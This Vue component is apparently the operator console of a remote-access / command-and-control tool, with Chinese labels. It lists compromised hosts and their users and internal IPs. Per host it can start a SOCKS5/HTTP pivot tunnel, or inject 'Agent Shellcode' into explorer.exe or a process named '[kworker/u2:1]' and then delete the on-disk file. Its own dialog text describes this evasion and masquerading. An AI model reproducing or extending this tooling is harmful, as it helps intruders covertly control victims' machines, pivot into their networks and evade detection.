<template>
  <div class="client-manager" @click="closeMenu">
    <el-card shadow="never">
      <template #header>
        <div class="card-header">
          <span>在线终端列表 (V2)</span>
          <el-button type="primary" :icon="Refresh" circle @click="fetchClients" :loading="loading" />
        </div>
      </template>

      <el-table 
        :data="clients" 
        style="width: 100%" 
        v-loading="loading"
        @row-contextmenu="openContextMenu"
      >
        <el-table-column prop="uuid" label="UUID" width="280" show-overflow-tooltip>
          <template #default="scope">
            <span style="font-family: 'JetBrains Mono', monospace; font-size: 13px;">{{ scope.row.uuid }}</span>
          </template>
        </el-table-column>

        <el-table-column prop="hostname" label="主机名" min-width="150" sortable>
          <template #default="scope">
            <span style="font-weight: bold;">{{ scope.row.hostname }}</span>
          </template>
        </el-table-column>

        <el-table-column prop="os" label="OS" width="120">
          <template #default="scope">
            <el-tag :type="getOsTag(scope.row.os)" size="small">
              {{ scope.row.os }}
            </el-tag>
          </template>
        </el-table-column>

        <el-table-column prop="username" label="用户" width="150" show-overflow-tooltip />

        <el-table-column prop="ip" label="内网 IP" min-width="140">
          <template #default="scope">
            <span style="font-family: 'JetBrains Mono', monospace;">{{ scope.row.ip }}</span>
          </template>
        </el-table-column>

        <el-table-column prop="last_seen" label="最近上线" width="160" sortable>
          <template #default="scope">
            <span style="color: #909399; font-size: 13px;">{{ formatTime(scope.row.last_seen) }}</span>
          </template>
        </el-table-column>

        <el-table-column prop="status" label="状态" align="center" width="100">
          <template #default="scope">
            <el-tag type="success" v-if="scope.row.status === 'online'">在线</el-tag>
            <el-tag type="info" v-else>离线</el-tag>
          </template>
        </el-table-column>

        <el-table-column label="操作" width="100" align="center" fixed="right">
          <template #default="scope">
            <el-dropdown trigger="click" @command="handleCommand($event, scope.row)">
              <span class="el-dropdown-link" style="cursor: pointer; color: #409EFF; display: flex; align-items: center; justify-content: center;">
                <span style="margin-right: 4px;">管理</span>
                <el-icon><ArrowDown /></el-icon>
              </span>
              <template #dropdown>
                <el-dropdown-menu>
                  <el-dropdown-item command="manage" icon="Monitor" :disabled="scope.row.status !== 'online'">
                    管理终端
                  </el-dropdown-item>
                  <el-dropdown-item command="tunnel" icon="Connection" :disabled="scope.row.status !== 'online'">
                    启动隧道
                  </el-dropdown-item>
                  <el-dropdown-item command="migrate" icon="Promotion" :disabled="scope.row.status !== 'online'">
                    迁移至内存
                  </el-dropdown-item>
                  <el-dropdown-item command="delete" icon="Delete" style="color: #F56C6C;">
                    删除主机
                  </el-dropdown-item>
                </el-dropdown-menu>
              </template>
            </el-dropdown>
          </template>
        </el-table-column>
      </el-table>
    </el-card>

    <!-- Quick Start Tunnel Dialog -->
    <el-dialog 
      title="启动网络隧道 (Network Tunnel)" 
      v-model="tunnelDialogVisible" 
      width="480px" 
      destroy-on-close
      center
    >
      <el-form label-position="top">
        <el-form-item label="服务监听端口 (VPS Port)">
          <el-input-number 
            v-model="tunnelForm.port" 
            :min="1" 
            :max="65535" 
            controls-position="right"
            style="width: 100%;" 
          />
        </el-form-item>

        <el-form-item label="隧道协议 (Protocol)">
          <el-radio-group v-model="tunnelForm.type" style="width: 100%; display: flex;">
            <el-radio-button label="socks5" style="flex: 1; text-align: center;">SOCKS5</el-radio-button>
            <el-radio-button label="http" style="flex: 1; text-align: center;">HTTP</el-radio-button>
          </el-radio-group>
        </el-form-item>

        <el-divider content-position="center">
          <el-icon style="vertical-align: middle; margin-right: 5px;"><Lock /></el-icon>
          安全设置 (Security)
        </el-divider>

        <el-form-item label="身份验证 (Authentication)">
          <el-switch 
            v-model="tunnelForm.enableAuth" 
            active-text="启用账号密码 (Enable)" 
            inactive-text="无认证 (Public)"
            style="--el-switch-on-color: #13ce66;"
          />
        </el-form-item>

        <transition name="el-zoom-in-top">
          <div v-if="tunnelForm.enableAuth" class="auth-box">
            <el-row :gutter="15">
              <el-col :span="12">
                <el-form-item label="用户名 (Username)">
                  <el-input 
                    v-model="tunnelForm.username" 
                    placeholder="例如: admin" 
                    :prefix-icon="User"
                  />
                </el-form-item>
              </el-col>
              <el-col :span="12">
                <el-form-item label="密码 (Password)">
                  <el-input 
                    v-model="tunnelForm.password" 
                    type="password" 
                    show-password 
                    placeholder="设置强密码" 
                    :prefix-icon="Key"
                  />
                </el-form-item>
              </el-col>
            </el-row>
            <el-alert title="提示：认证配置将同时应用于 SOCKS5/HTTP 代理。" type="info" :closable="false" show-icon />
          </div>
        </transition>
      </el-form>
      <template #footer>
        <span class="dialog-footer">
          <el-button @click="tunnelDialogVisible = false">取消</el-button>
          <el-button type="primary" @click="handleStartProxy" :loading="starting">立即开启</el-button>
        </span>
      </template>
    </el-dialog>

    <!-- Migration Dialog -->
    <el-dialog 
      title="进程迁移 (Process Migration / Code Injection)" 
      v-model="migrateDialogVisible" 
      width="400px" 
      destroy-on-close
      center
    >
      <el-alert
        title="内存迁移说明"
        type="warning"
        :closable="false"
        show-icon
        description="系统将把 Agent Shellcode 注入到目标进程中。一旦成功，当前磁盘上的文件将被删除并自动退出。"
        style="margin-bottom: 20px;"
      />
      <el-form label-position="top">
        <el-form-item label="目标进程名 (Target Process)">
          <el-input v-model="migrateProcess" placeholder="例如: explorer.exe" />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="migrateDialogVisible = false">取消</el-button>
        <el-button type="danger" @click="handleMigrate" :loading="migrating">立即迁移</el-button>
      </template>
    </el-dialog>

    <!-- Context Menu -->
    <div v-if="contextMenu.visible" :style="contextMenuStyle" class="custom-context-menu">
      <div 
        class="menu-item" 
        :class="{ disabled: contextMenu.row?.status !== 'online' }"
        @click="contextMenu.row?.status === 'online' && handleManageByContext()"
      >
        <el-icon><Monitor /></el-icon> 管理终端
      </div>
      <div 
        class="menu-item"
        :class="{ disabled: contextMenu.row?.status !== 'online' }"
        @click="contextMenu.row?.status === 'online' && openMigrateDialog()"
      >
        <el-icon><Promotion /></el-icon> 迁移至内存
      </div>
      <div 
        class="menu-item"
        :class="{ disabled: contextMenu.row?.status !== 'online' }"
        @click="contextMenu.row?.status === 'online' && openTunnelDialog()"
      >
        <el-icon><Connection /></el-icon> 启动隧道
      </div>
      <div class="menu-item delete" @click="handleDeleteByContext"><el-icon><Delete /></el-icon> 删除主机</div>
    </div>
  </div>
</template>

<script setup>
import { ref, reactive, computed, onMounted, onUnmounted } from 'vue'
import { useRouter } from 'vue-router'
import { ElMessage, ElMessageBox, ElLoading } from 'element-plus'
import { Refresh, Monitor, Delete, ArrowDown, Connection, Lock, User, Key, Promotion } from '@element-plus/icons-vue'
import api, { deleteClient } from '../api/index'
import { startTunnel } from '../api/socks'

const router = useRouter()
const clients = ref([])
const loading = ref(false)
let timer = null
const selectedRow = ref(null)

// Tunnel State
const tunnelDialogVisible = ref(false)
const starting = ref(false)
const tunnelForm = reactive({
  port: 1080,
  type: 'socks5',
  enableAuth: false,
  username: '',
  password: ''
})

// Migration State
const migrateDialogVisible = ref(false)
const migrating = ref(false)
const migrateProcess = ref('explorer.exe')

// Context Menu State
const contextMenu = reactive({
  visible: false,
  x: 0,
  y: 0,
  row: null
})

const contextMenuStyle = computed(() => ({
  top: `${contextMenu.y}px`,
  left: `${contextMenu.x}px`
}))

const openContextMenu = (row, column, event) => {
  event.preventDefault()
  contextMenu.x = event.clientX
  contextMenu.y = event.clientY
  contextMenu.row = row
  contextMenu.visible = true
}

const closeMenu = () => {
  contextMenu.visible = false
}

const handleCommand = (command, row) => {
  selectedRow.value = row
  switch (command) {
    case 'manage':
      handleManage()
      break
    case 'tunnel':
      tunnelDialogVisible.value = true
      break
    case 'migrate':
      migrateProcess.value = row.os?.toLowerCase().includes('linux') ? '[kworker/u2:1]' : 'explorer.exe'
      migrateDialogVisible.value = true
      break
    case 'delete':
      handleDelete()
      break
  }
}

const handleManage = () => {
  if (selectedRow.value) {
    router.push({ name: 'ClientDetail', params: { id: selectedRow.value.uuid } })
  }
}

const handleDelete = () => {
  const row = selectedRow.value
  if (!row) return

  ElMessageBox.confirm(
    `确定要删除主机 ${row.hostname} (${row.ip}) 吗？\n这将清除数据库中的记录，但在 Agent 进程停止前它可能会重新上线。`,
    '删除确认',
    {
      confirmButtonText: '确定删除',
      cancelButtonText: '取消',
      type: 'warning',
    }
  ).then(async () => {
    try {
      await deleteClient(row.uuid)
      ElMessage.success('主机记录已删除')
      fetchClients()
    } catch (e) {
      ElMessage.error('删除失败')
    }
  })
}

const fetchClients = async () => {
  loading.value = true
  try {
    const res = await api.get('/api/clients')
    clients.value = res.data
  } catch (e) {
    ElMessage.error('无法获取客户端列表')
  } finally {
    loading.value = false
  }
}

const getOsTag = (os) => {
  if (os?.toLowerCase().includes('win')) return 'primary'
  if (os?.toLowerCase().includes('linux')) return 'warning'
  return 'info'
}

const handleStartProxy = async () => {
  if (tunnelForm.enableAuth && (!tunnelForm.username || !tunnelForm.password)) {
    ElMessage.warning('启用认证时，用户名和密码不能为空')
    return
  }

  starting.value = true
  try {
    await startTunnel({
      uuid: selectedRow.value.uuid,
      port: String(tunnelForm.port),
      type: tunnelForm.type,
      username: tunnelForm.enableAuth ? tunnelForm.username : "",
      password: tunnelForm.enableAuth ? tunnelForm.password : ""
    })
    
    ElMessage.success('隧道启动成功 (Tunnel Started)')
    tunnelDialogVisible.value = false
  } catch (error) {
    const msg = error.response?.data?.message || '启动尝试失败'
    ElMessage.error(msg)
  } finally {
    starting.value = false
  }
}

const handleMigrate = async () => {
  if (!migrateProcess.value) {
    ElMessage.warning('请输入目标进程名')
    return
  }

  const loading = ElLoading.service({
    lock: true,
    text: '正在下发迁移指令，请稍候...',
    background: 'rgba(0, 0, 0, 0.7)',
  })

  migrating.value = true
  try {
    const res = await api.post('/api/clients/migrate', {
      uuid: selectedRow.value.uuid,
      target_process: migrateProcess.value
    })
    
    if (res.data.status === 'success') {
      ElMessage.success(res.data.message)
      migrateDialogVisible.value = false
      fetchClients()
    } else {
      ElMessage.error(res.data.message || '迁移失败')
    }
  } catch (error) {
    ElMessage.error(error.response?.data?.error || '请求失败')
  } finally {
    migrating.value = false
    loading.close()
  }
}

const handleManageByContext = () => {
  selectedRow.value = contextMenu.row
  handleManage()
  closeMenu()
}

const openMigrateDialog = () => {
  selectedRow.value = contextMenu.row
  migrateProcess.value = contextMenu.row?.os?.toLowerCase().includes('linux') ? '[kworker/u2:1]' : 'explorer.exe'
  migrateDialogVisible.value = true
  closeMenu()
}

const openTunnelDialog = () => {
  selectedRow.value = contextMenu.row
  tunnelDialogVisible.value = true
  closeMenu()
}

const handleDeleteByContext = () => {
  selectedRow.value = contextMenu.row
  handleDelete()
  closeMenu()
}

onMounted(() => {
  fetchClients()
  timer = setInterval(fetchClients, 5000)
})

onUnmounted(() => {
  if (timer) clearInterval(timer)
})

const formatTime = (timeStr) => {
  if (!timeStr || timeStr.startsWith('0001')) return '从不'
  const date = new Date(timeStr)
  return date.toLocaleString('zh-CN', {
    hour12: false,
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit'
  })
}
</script>

<style scoped>
.client-manager {
  width: 100%;
  height: 100%;
  display: flex;
  flex-direction: column;
  position: relative;
}

.client-manager .el-card {
  flex: 1;
  display: flex;
  flex-direction: column;
  background-color: #ffffff;
  border: 1px solid #ebeef5;
  box-shadow: 0 2px 12px 0 rgba(0,0,0,0.05);
}

:deep(.el-card__body) {
  flex: 1;
  overflow: auto;
  padding: 20px;
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 18px;
  font-weight: 600;
  color: #303133;
}

.auth-box {
  background-color: #f5f7fa;
  padding: 15px;
  border-radius: 4px;
  border: 1px dashed #dcdfe6;
  margin-bottom: 20px;
}
:deep(.el-radio-button) {
  flex: 1;
}
:deep(.el-radio-button__inner) {
  width: 100%;
}

/* Context Menu */
.custom-context-menu {
  position: fixed;
  background: #fff;
  border: 1px solid #ebeef5;
  border-radius: 4px;
  box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
  z-index: 3000;
  padding: 5px 0;
  min-width: 150px;
}

.menu-item {
  padding: 8px 15px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 14px;
  color: #606266;
  transition: all 0.2s;
}

.menu-item:hover {
  background-color: #f5f7fa;
  color: #409EFF;
}

.menu-item.delete {
  color: #F56C6C;
}

.menu-item.delete:hover {
  background-color: #fef0f0;
}

.menu-item.disabled {
  color: #c0c4cc;
  cursor: not-allowed;
  opacity: 0.6;
}

.menu-item.disabled:hover {
  background-color: transparent;
  color: #c0c4cc;
}
</style>
